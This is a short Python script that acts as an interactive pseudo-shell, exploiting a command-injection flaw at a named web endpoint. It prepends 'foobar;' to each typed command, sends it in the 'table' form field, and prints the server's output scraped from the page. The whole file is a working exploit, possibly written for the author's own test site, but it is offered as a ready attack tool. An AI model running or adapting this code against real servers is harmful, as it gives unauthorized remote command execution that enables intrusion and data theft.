#!/usr/bin/python3
'''
a basic pseudo-shell using an RCE flaw against http://burmat.co/selectall
to simulate a shell
'''
import requests, readline
from bs4 import BeautifulSoup

url  = 'http://burmat.co/selectall'
headers = { "Content-Type" : "application/x-www-form-urlencoded" }


def execute(cmd):
    cmd = "foobar;" + cmd
    res = requests.post(url, data = {"table":cmd}, headers=(headers))
    parse_output(res.text)

def parse_output(output):
    soup = BeautifulSoup(output, features="lxml")
    print(soup.find('pre').get_text().lstrip().rstrip())

def quit():
    print('\n[>] Bye!')
    exit(0)

while True:
    try:
        cmd = input('\033[41m[server~$]>>: \033[0m ')
        if cmd == "exit":
            break
        else:
            execute(cmd)
    except KeyboardInterrupt:
        quit()

quit()
